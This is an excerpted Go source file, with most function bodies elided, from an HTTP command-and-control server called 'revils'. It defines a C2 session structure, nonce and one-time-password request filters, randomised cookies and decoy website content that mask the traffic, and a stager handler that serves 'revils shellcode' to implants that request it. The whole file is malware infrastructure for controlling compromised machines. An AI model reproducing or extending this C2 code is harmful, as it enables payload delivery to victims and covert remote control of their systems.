...
import (
	...
	"github.com/Kevin-kitnick/revils/server/website"
...
// HTTPSession - Holds data related to a revils c2 session
...
// RevilsHTTPC2 - Holds refs to all the C2 objects
type RevilsHTTPC2 struct {
	HTTPServer   *http.Server
	ServerConf   *HTTPServerConfig // Server config (user args)
	HTTPSessions *HTTPSessions
	RevilsStage  []byte // Revils shellcode to serve during staging process
	Cleanup      func()

	c2Config *configs.HTTPC2Config // C2 config (from config file)
}

func (s *RevilsHTTPC2) getServerHeader() string {
...
func (s *RevilsHTTPC2) getCookieName() string {
	cookies := configs.GetHTTPC2Config().ServerConfig.Cookies
	index := insecureRand.Intn(len(cookies))
	return cookies[index]
}

func (s *RevilsHTTPC2) LoadC2Config() *configs.HTTPC2Config {
	if s.c2Config != nil {
		return s.c2Config
	}
...
func StartHTTPListener(conf *HTTPServerConfig) (*RevilsHTTPC2, error) {
...
func (s *RevilsHTTPC2) router() *mux.Router {
...
func (s *RevilsHTTPC2) noCacheHeader(resp http.ResponseWriter) {
	resp.Header().Add("Cache-Control", "no-store, no-cache, must-revalidate")
}

// This filters requests that do not have a valid nonce
func (s *RevilsHTTPC2) filterNonce(req *http.Request, rm *mux.RouteMatch) bool {
...
func (s *RevilsHTTPC2) filterOTP(req *http.Request, rm *mux.RouteMatch) bool {
...
func (s *RevilsHTTPC2) DefaultRespHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
...
func (s *RevilsHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) error {
...
func (s *RevilsHTTPC2) defaultHandler(resp http.ResponseWriter, req *http.Request) {
...
func (s *RevilsHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
	...
	sessionInit := &revilspb.HTTPSescionInit{}
...
func (s *RevilsHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
...
func (s *RevilsHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
...
func (s *RevilsHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseWriter, req *http.Request) ([]byte, error) {
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
...
func (s *RevilsHTTPC2) getServerPollTimeout() time.Duration {
...
func (s *RevilsHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request) {
...
// stagerHandler - Serves the revils shellcode to the stager requesting it
func (s *RevilsHTTPC2) stagerHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Stager request")
	if len(s.RevilsStage) != 0 {
		httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
		s.noCacheHeader(resp)
		resp.Write(s.RevilsStage)
		httpLog.Infof("Serving revils shellcode (size %d) to %s", len(s.RevilsStage), getRemoteAddr(req))
		resp.WriteHeader(http.StatusOK)
	} else {
		resp.WriteHeader(http.StatusNotFound)
	}
...
func (s *RevilsHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
